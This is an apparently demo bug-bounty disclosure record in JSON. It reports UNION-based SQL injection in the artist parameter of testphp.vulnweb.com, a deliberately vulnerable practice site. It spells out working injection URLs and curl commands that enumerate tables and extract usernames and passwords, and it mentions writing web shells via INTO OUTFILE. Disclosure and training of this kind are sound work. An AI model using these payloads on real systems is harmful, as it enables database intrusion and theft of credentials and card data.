{
  "id": 800006,
  "title": "UNION-based SQL Injection in artists.php Allows Full Database Extraction on testphp.vulnweb.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "visibility": "full",
  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
  "reporter": {"username": "resurface_demo"},
  "weakness": {"id": 67, "name": "SQL Injection"},
  "vulnerability_information": "## Summary\nThe `artist` parameter on `http://testphp.vulnweb.com/artists.php` is vulnerable to UNION-based SQL Injection. The query uses 3 columns, and by injecting a UNION SELECT statement, an attacker can extract the names of all database tables and their contents. The database contains tables: `artists`, `carts`, `categ`, `featured`, `guestbook`, `pictures`, `products`, and `users`.\n\n## Steps to Reproduce\n1. Confirm SQL Injection by injecting a single quote:\n```\nhttp://testphp.vulnweb.com/artists.php?artist=1'\n```\nResponse: `Error: You have an error in your SQL syntax...`\n\n2. Determine the number of columns using ORDER BY:\n```\nhttp://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 3--    → works\nhttp://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 4--    → error\n```\nThis confirms the query uses 3 columns.\n\n3. Extract all table names from the current database:\n```\nhttp://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\n```\nResponse includes: `artists,carts,categ,featured,guestbook,pictures,products,users`\n\n4. Extract column names from the `users` table:\n```\nhttp://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--\n```\n\n5. Extract user credentials:\n```\nhttp://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,group_concat(uname,0x3a,pass),3 FROM users--\n```\n\n## Proof of Concept\n```bash\n# Extract all table names\ncurl -s 'http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--'\n\n# Extract user credentials\ncurl -s 'http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,group_concat(uname,0x3a,pass),3%20FROM%20users--'\n```\n\nThe UNION SELECT response is rendered directly in the artist details section of the page, showing the extracted data in place of normal artist information.\n\n## Impact\n- **Full database enumeration** — all table names, column names, and data can be extracted\n- **Credential theft** — usernames and passwords from the `users` table\n- **Credit card data** — the `users` table contains credit card numbers (ucc field)\n- **Data modification** — with stacked queries or UPDATE via subqueries\n- **Potential RCE** — via MySQL `LOAD_FILE()` to read server files or `INTO OUTFILE` to write web shells",
  "disclosed_at": "2025-07-15T16:00:00.000Z",
  "bounty_amount": "5000.0"
}
